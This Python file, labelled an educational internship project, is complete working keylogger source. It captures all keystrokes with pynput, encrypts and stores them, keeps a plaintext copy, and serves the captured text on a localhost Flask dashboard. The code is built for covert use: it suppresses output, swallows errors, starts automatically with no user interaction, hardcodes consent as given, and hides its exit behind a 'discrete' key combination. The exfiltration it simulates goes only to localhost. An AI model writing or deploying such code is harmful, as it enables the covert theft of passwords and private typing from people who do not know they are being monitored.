#!/usr/bin/env python3
"""
Educational Keylogger for Cybersecurity Internship Project #3
Objective: Build a proof-of-concept keylogger that encrypts logs and simulates exfiltration
Student Internship Project - Educational Purpose Only
Submission Date: July 28, 2025
"""

import os
import sys
import time
import json
import threading
from datetime import datetime
from pathlib import Path

# Third-party imports
try:
    from pynput import keyboard
    from cryptography.fernet import Fernet
    from flask import Flask, render_template_string, request, jsonify
except ImportError as e:
    sys.exit(1)

class EducationalKeylogger:
    def __init__(self):
        # Educational and ethical setup
        self.educational_mode = True
        self.consent_given = True  # Auto-consent for educational demo
        self.project_info = {
            "project": "Cybersecurity Internship Project #3",
            "objective": "Keylogger with Encrypted Data Exfiltration",
            "student": "Educational Purpose Only",
            "date": "July 28, 2025"
        }
        
        # Core functionality
        self.log_file = "encrypted_keystrokes.log"
        self.metadata_file = "session_metadata.json"
        self.key_file = "encryption.key"
        self.running = False
        self.listener = None
        self.flask_thread = None
        
        # Kill switch tracking
        self.pressed_keys = set()
        
        # Load or generate encryption key
        self.key = self.load_key()
        self.cipher = Fernet(self.key)
        
        # Initialize Flask app
        self.app = Flask(__name__)
        self.setup_flask_routes()
        
    def write_key(self):
        """Generates a key and saves it into a file"""
        key = Fernet.generate_key()
        with open(self.key_file, "wb") as key_file:
            key_file.write(key)
        return key
    
    def load_key(self):
        """Loads the key from the encryption.key file"""
        try:
            with open(self.key_file, "rb") as key_file:
                key = key_file.read()
            return key
        except FileNotFoundError:
            return self.write_key()
    
    def log_keystroke(self, key_data):
        """Log encrypted keystroke with timestamp"""
        timestamp = datetime.now().isoformat()
        log_entry = {
            "timestamp": timestamp,
            "key": key_data,
            "session": "educational_demo"
        }
        
        # Encrypt the log entry
        encrypted_data = self.cipher.encrypt(json.dumps(log_entry).encode())
        
        # Append to encrypted log file
        with open(self.log_file, "ab") as f:
            f.write(encrypted_data + b"\n")
        
        # Also store decrypted version for educational dashboard
        decrypted_file = "decrypted_logs_for_dashboard.json"
        try:
            with open(decrypted_file, "r") as f:
                logs = json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            logs = []
        
        logs.append(log_entry)
        
        with open(decrypted_file, "w") as f:
            json.dump(logs, f, indent=2)
    
    def check_kill_switch(self):
        """Check if kill switch combination is pressed (Ctrl+Shift+F12)"""
        required_keys = {
            keyboard.Key.ctrl_l,  # Left Ctrl
            keyboard.Key.shift,   # Shift
            keyboard.Key.f12      # F12
        }
        
        # Also check for right Ctrl as alternative
        alt_required_keys = {
            keyboard.Key.ctrl_r,  # Right Ctrl
            keyboard.Key.shift,   # Shift
            keyboard.Key.f12      # F12
        }
        
        return (required_keys.issubset(self.pressed_keys) or 
                alt_required_keys.issubset(self.pressed_keys))
    
    def on_key_press(self, key):
        """Handle key press events"""
        try:
            # Add key to pressed keys set
            self.pressed_keys.add(key)
            
            # Check for kill switch combination (Ctrl+Shift+F12)
            if self.check_kill_switch():
                self.stop_logging()
                return False
            
            # Process different key types for logging
            if hasattr(key, 'char') and key.char:
                key_data = key.char
            else:
                key_data = f"[{key.name}]" if hasattr(key, 'name') else str(key)
            
            self.log_keystroke(key_data)
            
        except Exception as e:
            pass
    
    def on_key_release(self, key):
        """Handle key release events"""
        try:
            # Remove key from pressed keys set
            self.pressed_keys.discard(key)
        except Exception as e:
            pass
    
    def start_logging(self):
        """Start the keylogger"""
        self.running = True
        
        # Start Flask server in background
        self.flask_thread = threading.Thread(target=self.run_flask_server, daemon=True)
        self.flask_thread.start()
        
        # Start keystroke listener with both press and release handlers
        try:
            with keyboard.Listener(
                on_press=self.on_key_press,
                on_release=self.on_key_release
            ) as listener:
                self.listener = listener
                listener.join()
        except KeyboardInterrupt:
            self.stop_logging()
    
    def stop_logging(self):
        """Stop the keylogger"""
        self.running = False
        
        # Save session metadata
        metadata = {
            "project": self.project_info,
            "session_end": datetime.now().isoformat(),
            "key_file": self.key_file,
            "log_file": self.log_file,
            "educational_mode": self.educational_mode
        }
        
        with open(self.metadata_file, "w") as f:
            json.dump(metadata, f, indent=2)
    
    def decrypt_logs_for_viewing(self, encrypted_key=None):
        """Decrypt logs for educational viewing"""
        if not os.path.exists(self.log_file):
            return []
        
        # Use provided key or default key
        decrypt_key = encrypted_key.encode() if encrypted_key else self.key
        cipher = Fernet(decrypt_key)
        
        decrypted_logs = []
        try:
            with open(self.log_file, "rb") as f:
                for line in f:
                    if line.strip():
                        try:
                            decrypted_data = cipher.decrypt(line.strip())
                            log_entry = json.loads(decrypted_data.decode())
                            decrypted_logs.append(log_entry)
                        except Exception as e:
                            pass
            
        except Exception as e:
            pass
        
        return decrypted_logs
    
    def setup_flask_routes(self):
        """Setup Flask web server routes"""
        
        @self.app.route('/')
        def dashboard():
            """Educational dashboard"""
            return render_template_string("""
<!DOCTYPE html>
<html>
<head>
    <title>Educational Keylogger Dashboard</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background-color: #f5f5f5; }
        .header { background-color: #2c3e50; color: white; padding: 20px; border-radius: 5px; margin-bottom: 20px; }
        .warning { background-color: #e74c3c; color: white; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
        .info-box { background-color: white; padding: 20px; border-radius: 5px; margin-bottom: 20px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .log-entry { background-color: #ecf0f1; padding: 10px; margin: 5px 0; border-radius: 3px; font-family: monospace; }
        .decrypt-form { background-color: #3498db; color: white; padding: 20px; border-radius: 5px; margin-bottom: 20px; }
        input[type="text"] { width: 300px; padding: 10px; margin: 10px; border: none; border-radius: 3px; }
        button { background-color: #27ae60; color: white; padding: 10px 20px; border: none; border-radius: 3px; cursor: pointer; }
        button:hover { background-color: #229954; }
        .status { color: #27ae60; font-weight: bold; }
        .key-info { background-color: #f39c12; color: white; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
        .automation { background-color: #9b59b6; color: white; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
        .kill-switch { background-color: #e67e22; color: white; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🎓 Educational Keylogger Dashboard</h1>
        <p><strong>Project:</strong> {{ project_info.project }}</p>
        <p><strong>Objective:</strong> {{ project_info.objective }}</p>
        <p><strong>Date:</strong> {{ project_info.date }}</p>
    </div>
    
    <div class="warning">
        ⚠️ <strong>EDUCATIONAL PURPOSE ONLY</strong> - This is a cybersecurity internship project for learning malware analysis and encryption techniques.
    </div>
    
    <div class="automation">
        🤖 <strong>FULLY AUTOMATED MODE</strong><br>
        • No user interaction required<br>
        • Starts automatically on execution<br>
        • Silent operation (no terminal output)<br>
        • Discrete kill switch combination
    </div>
    
    <div class="kill-switch">
        🛑 <strong>KILL SWITCH: Ctrl+Shift+F12</strong><br>
        • Press and hold: Ctrl + Shift + F12<br>
        • Immediate termination when combo detected<br>
        • More discrete than single key activation<br>
        • Works with both left and right Ctrl keys
    </div>
    
    <div class="key-info">
        🔐 <strong>Encryption Key Management</strong><br>
        Key File: {{ key_file }}<br>
        Key Status: Active and loaded from file<br>
        Encryption: Fernet (AES 128 in CBC mode)
    </div>
    
    <div class="info-box">
        <h3>📊 Session Status</h3>
        <p class="status">✅ Educational keylogger running automatically</p>
        <p><strong>Encrypted Log File:</strong> {{ log_file }}</p>
        <p><strong>Total Encrypted Entries:</strong> {{ log_count }}</p>
        <p><strong>Last Updated:</strong> {{ last_update }}</p>
    </div>
    
    <div class="decrypt-form">
        <h3>🔓 Decrypt Logs for Educational Review</h3>
        <p>Enter the decryption key to view captured keystrokes:</p>
        <form method="post" action="/decrypt">
            <input type="text" name="decrypt_key" placeholder="Enter Fernet decryption key" required>
            <button type="submit">Decrypt and View Logs</button>
        </form>
        <p><small>💡 Hint: The key is stored in {{ key_file }}</small></p>
    </div>
    
    <div class="info-box">
        <h3>🛡️ Educational Features Demonstrated</h3>
        <ul>
            <li>✅ Cross-platform keystroke capture (Windows/Linux)</li>
            <li>✅ Fernet encryption with file-based key storage</li>
            <li>✅ Local storage with timestamps</li>
            <li>✅ Simulated data exfiltration (localhost server)</li>
            <li>✅ Discrete kill switch (Ctrl+Shift+F12)</li>
            <li>✅ Silent operation mode</li>
            <li>✅ Fully automated execution</li>
            <li>✅ No user interaction required</li>
        </ul>
    </div>
    
    <div class="info-box">
        <h3>🔧 Technical Implementation</h3>
        <p><strong>Encryption Key Storage:</strong> {{ key_file }}</p>
        <p><strong>Key Format:</strong> 32 url-safe base64-encoded bytes</p>
        <p><strong>Encryption Algorithm:</strong> Fernet (AES-128 in CBC mode with HMAC)</p>
        <p><strong>Operation Mode:</strong> Fully automated (no user interaction)</p>
        <p><strong>Kill Switch:</strong> Ctrl+Shift+F12 combination</p>
        <p><strong>Key Tracking:</strong> Real-time combination detection</p>
    </div>
</body>
</html>
            """, 
            project_info=self.project_info,
            key_file=self.key_file,
            log_file=self.log_file,
            log_count=self.get_log_count(),
            last_update=datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            )
        
        @self.app.route('/decrypt', methods=['POST'])
        def decrypt_logs():
            """Decrypt and display logs"""
            decrypt_key = request.form.get('decrypt_key')
            
            if not decrypt_key:
                return "Decryption key required", 400
            
            try:
                # Try to decrypt with provided key
                logs = self.decrypt_logs_for_viewing(decrypt_key)
                
                return render_template_string("""
<!DOCTYPE html>
<html>
<head>
    <title>Decrypted Educational Logs</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background-color: #f5f5f5; }
        .header { background-color: #2c3e50; color: white; padding: 20px; border-radius: 5px; margin-bottom: 20px; }
        .warning { background-color: #e74c3c; color: white; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
        .log-entry { background-color: white; padding: 15px; margin: 10px 0; border-radius: 5px; border-left: 4px solid #3498db; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .timestamp { color: #7f8c8d; font-size: 0.9em; }
        .keystroke { font-family: monospace; background-color: #ecf0f1; padding: 5px; border-radius: 3px; }
        button { background-color: #3498db; color: white; padding: 10px 20px; border: none; border-radius: 3px; cursor: pointer; text-decoration: none; display: inline-block; }
    </style>
</head>
<body>
    <div class="header">
        <h1>🔓 Decrypted Educational Logs</h1>
        <a href="/" style="color: white;">← Back to Dashboard</a>
    </div>
    
    <div class="warning">
        📚 <strong>EDUCATIONAL CONTENT</strong> - These logs demonstrate encrypted keystroke capture for cybersecurity learning purposes.
    </div>
    
    <h3>📝 Captured Keystrokes ({{ log_count }} entries)</h3>
    
    {% for log in logs %}
    <div class="log-entry">
        <div class="timestamp">{{ log.timestamp }}</div>
        <div class="keystroke">{{ log.key }}</div>
        <small>Session: {{ log.session }}</small>
    </div>
    {% endfor %}
    
    {% if not logs %}
    <div class="log-entry">
        <p>No logs found or incorrect decryption key provided.</p>
    </div>
    {% endif %}
    
</body>
</html>
                """, logs=logs, log_count=len(logs))
                
            except Exception as e:
                return f"Decryption failed: Invalid key or corrupted data. Error: {e}", 400
        
        @self.app.route('/api/status')
        def api_status():
            """API endpoint for status"""
            return jsonify({
                "status": "running" if self.running else "stopped",
                "project": self.project_info,
                "key_file": self.key_file,
                "log_file": self.log_file,
                "log_count": self.get_log_count(),
                "educational_mode": self.educational_mode,
                "kill_switch": "Ctrl+Shift+F12"
            })
    
    def get_log_count(self):
        """Count number of log entries"""
        try:
            with open(self.log_file, "rb") as f:
                return sum(1 for line in f if line.strip())
        except FileNotFoundError:
            return 0
    
    def run_flask_server(self):
        """Run Flask server for educational dashboard"""
        try:
            import logging
            log = logging.getLogger('werkzeug')
            log.setLevel(logging.ERROR)
            self.app.run(host='localhost', port=5000, debug=False, use_reloader=False)
        except Exception as e:
            pass

def main():
    """Main function to run educational keylogger"""
    # Initialize keylogger
    keylogger = EducationalKeylogger()
    
    try:
        # Start the educational keylogger automatically
        keylogger.start_logging()
    except KeyboardInterrupt:
        pass
    except Exception as e:
        pass
    finally:
        keylogger.stop_logging()

if __name__ == "__main__":
    main()
